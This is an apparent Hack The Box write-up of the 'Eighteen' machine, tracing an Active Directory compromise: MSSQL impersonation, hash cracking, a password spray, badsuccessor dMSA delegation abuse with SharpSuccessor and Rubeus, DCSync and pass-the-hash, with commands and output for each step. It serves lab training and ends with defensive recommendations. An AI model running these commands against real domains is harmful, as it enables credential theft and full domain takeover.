---
title: "Eighteen — MSSQL Impersonation to badsuccessor Delegation and DCSync"
description: "A weakly secured MSSQL database yields cracked credentials, then badsuccessor OU delegation and DCSync complete domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - mssql
  - kerberos
  - dcsync
objective: "Escalate from provided MSSQL credentials through impersonation and a misconfigured OU delegation to domain administrative control."
tools:
  - rustscan
  - NetExec
  - Impacket
  - hashcat
  - evil-winrm
  - proxychains
  - rubeus
  - sharpsuccessor
skill: "Active Directory privilege escalation via MSSQL impersonation and Kerberos delegation abuse"
outcome: "Domain user access over WinRM followed by recovery of the Administrator NTLM hash through a badsuccessor dMSA and DCSync"
---

## At a glance

| Field | Value |
|---|---|
| Target environment | Windows Server 2025 domain controller; IIS, Microsoft SQL Server 2022, and WinRM exposed |
| Starting position | Unauthenticated network access with provided `<MSSQL_USER>` credentials |
| Objective | Reach domain administrative control from the provided MSSQL credentials |
| Outcome | Domain user access over WinRM; `<PRIVILEGED_USER>` NTLM hash recovered via a badsuccessor dMSA and DCSync |

## From MSSQL impersonation to badsuccessor delegation

Eighteen is a Windows Active Directory lab whose domain controller also runs Microsoft SQL Server. A provided `<MSSQL_USER>` login can impersonate the `<DATABASE_USER>` login, which exposes an application database whose stored PBKDF2-SHA256 password hash cracks to a weak value; that same value authenticates the domain account `<DOMAIN_USER>` over WinRM. Loopback LDAP enumeration then finds a misconfigured organizational unit, and the badsuccessor technique creates a delegated Managed Service Account whose S4U delegation rights enable DCSync of the `<PRIVILEGED_USER>` NTLM hash. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves command syntax. See [how evidence is handled](/method/). Results not accompanied by captured command output are presented from the recorded narrative.

**Attack path:** **Provided MSSQL credentials → `IMPERSONATE` over `<DATABASE_USER>` → application database hash cracking → password reuse on `<DOMAIN_USER>` over WinRM → loopback LDAP discovery → badsuccessor dMSA creation → S4U delegation abuse → DCSync → `<PRIVILEGED_USER>`**

## MSSQL starting credentials on a 2025 domain controller

- **Target:** a Windows Server 2025 domain controller (`<DOMAIN_CONTROLLER>`) in the `<LAB_DOMAIN>` Active Directory domain, exposing IIS, Microsoft SQL Server 2022, and WinRM.
- **Starting position:** unauthenticated network access plus a provided credential pair for the `<MSSQL_USER>` domain account.
- **Objective:** reach domain administrative control from the provided MSSQL credentials.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: MSSQL impersonation to DCSync

### 1. Service Enumeration

Observation: a fast TCP scan exposes three services on the target host: IIS on 80, Microsoft SQL Server 2022 on 1433, and WinRM on 5985.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-TCP
```

```text
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The lab provides starting credentials for the `<MSSQL_USER>` account, which authenticate against MSSQL with local authentication:

```bash
nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth
```

```text
MSSQL  <TARGET_IP>  1433  <DOMAIN_CONTROLLER>  [+] <DOMAIN_CONTROLLER>\<MSSQL_USER>:<MSSQL_CREDENTIALS>
```

Significance: the MSSQL login is the only credentialed starting point, and WinRM is the service that the reused domain credential later reaches.

Result: IIS, MSSQL, and WinRM are confirmed, and the provided `<MSSQL_USER>` credentials are accepted by MSSQL.

### 2. MSSQL Impersonation and Database Enumeration

Observation: an interactive MSSQL session shows that `<MSSQL_USER>` holds an `IMPERSONATE` grant over the `<DATABASE_USER>` login.

```bash
impacket-mssqlclient <LAB_DOMAIN>/<MSSQL_USER>:'<MSSQL_CREDENTIALS>'@<TARGET_IP>
```

```text
b'LOGIN'     b''        IMPERSONATE       GRANT        <MSSQL_USER>     <DATABASE_USER>
```

The session is switched to the `<DATABASE_USER>` context, where enumeration exposes the `<APPLICATION_DATABASE>` database and its `users` table:

```sql
exec_as_login <DATABASE_USER>
enum_db
use <APPLICATION_DATABASE>
SELECT * FROM USERS;
```

```text
name                is_trustworthy_on
-----------------   -----------------
master                              0
tempdb                              0
model                               0
msdb                                1
<APPLICATION_DATABASE>              0
```

```text
1002   admin   admin   admin@<LAB_DOMAIN>   pbkdf2:sha256:600000$<SALT>$<STORED_HASH_HEX>
```

Significance: the impersonation grant lets a low-privileged SQL login read the data available to another login, and the application's `users` table stores account password hashes.

Result: the `<APPLICATION_DATABASE>` database is reachable under the impersonated context, and an administrative password hash in Django PBKDF2-SHA256 format is recovered.

### 3. Hash Cracking and Credential Recovery

Observation: the stored secret is a PBKDF2-SHA256 hash in Django format, so the hex-encoded digest must be re-encoded to base64 before hashcat can parse it.

```bash
echo '<STORED_HASH_HEX>' | xxd -r -p | base64
hashcat admin.hash /wordlists/rockyou.txt -D2 -w3
```

```text
<CRACKED_PASSWORD>
```

Significance: despite 600,000 PBKDF2 iterations, the account password is a common wordlist entry, so the stored hash yields the plaintext credential.

Result: the administrative application password is recovered from the stored hash.

### 4. Password Spray and WinRM Access

Observation: domain users are enumerated through MSSQL with RID brute-forcing, and the recovered password is sprayed across those accounts over WinRM.

```bash
nxc mssql <TARGET_IP> -u '<MSSQL_USER>' -p '<MSSQL_CREDENTIALS>' --local-auth --rid-brute \
      | awk 'index($0,"<LAB_DOMAIN>\\")' | awk '{print $NF}' | awk -F'\\' '{print $2}' > users.txt
nxc winrm <TARGET_IP> -u users.txt -p '<CRACKED_PASSWORD>' --continue-on-success
```

```text
WINRM  <TARGET_IP>  5985  <DOMAIN_CONTROLLER>  [+] <LAB_DOMAIN>\<DOMAIN_USER>:<CRACKED_PASSWORD> (Pwn3d!)
```

Significance: the same password that protects the application's admin account also authenticates a directory account over WinRM, so one cracked secret crosses from the application database into a domain user.

Result: `<DOMAIN_USER>` reuses the recovered password, and the authenticated WinRM session establishes initial domain user access on the domain controller.

### 5. Loopback LDAP Discovery

Observation: from the `<DOMAIN_USER>` shell, local listening sockets show directory services bound to all interfaces, so the target is the domain controller itself.

```powershell
netstat -ano
```

```text
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       824
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       384
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       824
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       824
  ...
```

Significance: LDAP (389), Kerberos (88), and LDAPS (636) are reachable from the compromised host over its loopback address, so the directory can be targeted from the foothold without lateral movement.

Result: the foothold host is confirmed as the domain controller, and its directory services are locally reachable.

### 6. badsuccessor dMSA Creation

Observation: the `badsuccessor` NetExec module, routed through proxychains to the loopback LDAP endpoint, flags an organizational unit as exploitable.

```bash
proxychains nxc ldap <LAB_DOMAIN> -u '<DOMAIN_USER>' -p '<CRACKED_PASSWORD>' -M badsuccessor
```

```text
BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  [+] Found domain controller: <DOMAIN_CONTROLLER>.<LAB_DOMAIN>
BADSUCCE... <LOOPBACK_IP>  389  <DOMAIN_CONTROLLER>  <OU_NAME> (S-1-5-21-...-1604), <OU_DN>
```

The `badsuccessor` technique then creates a delegated Managed Service Account (dMSA) in the exploitable OU with delegation rights:

```text
execute-assembly SharpSuccessor.exe -- 'add /path:"<OU_DN>" /account:<DOMAIN_USER> /name:<DMSA_ACCOUNT> /impersonate:<PRIVILEGED_USER>'
```

Significance: on Windows Server 2025, a principal that can create a dMSA in an OU can attach delegation rights and later request service tickets on behalf of arbitrary accounts.

Result: an exploitable OU is identified, and a dMSA account with the authority to impersonate `<PRIVILEGED_USER>` is created.

### 7. S4U Delegation Abuse

Observation: with the dMSA in place, a TGT is obtained for `<DOMAIN_USER>`, then a service ticket is requested for the dMSA account using S4U2self/S4U2proxy to impersonate `<PRIVILEGED_USER>`.

```text
execute-assembly Rubeus.exe -- 'asktgt /user:<DOMAIN_USER> /password:<CRACKED_PASSWORD> /force /opsec /nowrap /ptt /outfile:<DOMAIN_USER>.kirbi'
execute-assembly Rubeus.exe -- 'asktgs /targetuser:<DMSA_ACCOUNT>$ /service:krbtgt/<LAB_DOMAIN> /opsec /dmsa /nowrap /ptt /ticket:<DOMAIN_USER>.kirbi /outfile:<DMSA_TGS>'
```

Kerberos authentication requires the attacker's clock to match the domain controller, so I checked the DC time over LDAP and set the local clock from it:

```bash
set DC_TIME (proxychains ldapsearch -x -H ldap://<DOMAIN_CONTROLLER>.<LAB_DOMAIN> -s base -b "" currentTime \
            | grep '^currentTime:' | sed -E 's/currentTime: ([0-9]{4})([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2})([0-9]{2}).*/\1-\2-\3 \4:\5:\6/')
echo $DC_TIME
sudo date -u -s "$DC_TIME"
```

The `badsuccessor` module is then invoked again with dMSA options to configure the delegation:

```bash
proxychains netexec ldap <DOMAIN_CONTROLLER>.<LAB_DOMAIN> \
                -u <DOMAIN_USER> -p '<CRACKED_PASSWORD>' \
                -M badsuccessor \
                -o TARGET_OU='<OU_DN>' \
                   DMSA_NAME=<DMSA_ACCOUNT_2> \
                   TARGET_ACCOUNT=<PRIVILEGED_USER>
```

Significance: S4U2self/S4U2proxy with the dMSA's delegation rights produces a service ticket that acts as `<PRIVILEGED_USER>` for services such as `krbtgt`.

Result: a delegated Kerberos ticket impersonating `<PRIVILEGED_USER>` is obtained; I could not verify the step from captured output, so the result comes from the recorded narrative.

### 8. DCSync and Domain Administrative Access

Observation: with the delegated ticket cached, DCSync is run against the domain controller to replicate directory secrets.

```bash
KRB5CCNAME='<DMSA_ACCOUNT_2>$.ccache' proxychains -q netexec smb <DOMAIN_CONTROLLER>.<LAB_DOMAIN> --use-kcache --ntds
```

```text
<PRIVILEGED_USER>:500:aad3b...:<PRIVILEGED_USER_NTHASH>:::
```

The recovered NTLM hash is then used for pass-the-hash authentication over WinRM:

```bash
proxychains evil-winrm -i <DOMAIN_CONTROLLER>.<LAB_DOMAIN> -u <PRIVILEGED_USER> -H <PRIVILEGED_USER_NTHASH>
```

Significance: the delegated ticket carried sufficient replication rights to read the directory password database, and the extracted hash provides passwordless authentication as `<PRIVILEGED_USER>`.

Result: the `<PRIVILEGED_USER>` NTLM hash is recovered, and a WinRM session in the Administrator context is obtained.

## Challenges: hash format, clock skew, and loopback routing

| Challenge | Decision | Rationale |
|---|---|---|
| Stored hash in Django PBKDF2 format is not directly parseable by hashcat | Re-encoded the hex digest to base64 before cracking | Required by the `pbkdf2_sha256` hashcat mode |
| Kerberos ticket operations need the attacker clock aligned with the domain | Read the DC time over LDAP and set the local clock from it | Kerberos rejects requests outside its clock-skew window |
| Directory services are reachable from the compromised host via its loopback address | Routed LDAP and SMB tooling through proxychains from the compromised host | Reached directory services over the loopback address without lateral movement |

## Outcome: WinRM domain user and privileged NTLM hash

The `--ntds` export line proves recovery of the `<PRIVILEGED_USER>` NTLM hash. It does not by itself prove the full dMSA delegation transition from authenticated `<DOMAIN_USER>` access over WinRM. That path is recorded in the preceding narrative and commands. HTTP/IIS on port 80 was enumerated but not used against the target.

## Recommendations: impersonation, weak hashing, reuse, dMSA, and DCSync

The lab did not validate any of the recommendations below.

1. **MSSQL impersonation and least privilege.** `<MSSQL_USER>` could impersonate `<DATABASE_USER>`, which exposed the application database and its credentials. *Prevent:* remove unnecessary `IMPERSONATE` grants and review them regularly.
2. **Weak stored application credential.** A PBKDF2-SHA256 hash with 600,000 iterations was cracked against rockyou. *Prevent:* raise iteration counts, enforce length and complexity, and keep credentials out of queryable tables; *detect:* monitor access to credential-bearing tables.
3. **Cross-service password reuse.** The cracked application password also authenticated `<DOMAIN_USER>` over WinRM. *Prevent:* require unique credentials per account and service; *detect:* monitor for the same secret across authentication sources.
4. **Abusable OU delegation via dMSA.** A writable OU allowed creation of a dMSA with delegation rights, enabling S4U impersonation. *Prevent:* restrict who may create dMSAs and review OU ACLs; *detect:* monitor dMSA creation in sensitive OUs.
5. **Unrestricted replication rights (DCSync).** The delegated ticket allowed replication of directory secrets. *Prevent:* limit the `DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All` rights; *detect:* monitor for replication of privileged accounts outside normal replication partners.

## References

- [Hack The Box — Eighteen](https://app.hackthebox.com/machines/Eighteen) (retired Windows machine)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) (MSSQL, WinRM, LDAP, and SMB operations)
- [Impacket — `mssqlclient.py`](https://github.com/fortra/impacket) (interactive MSSQL client)
- [Hashcat — Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (password recovery for the `pbkdf2_sha256` mode)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (WinRM shell and pass-the-hash authentication)
- [proxychains-ng](https://github.com/haad/proxychains) (routing tool traffic to a loopback endpoint)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos TGT and S4U ticket operations)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor) (badsuccessor dMSA creation and abuse)
- [Microsoft — Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
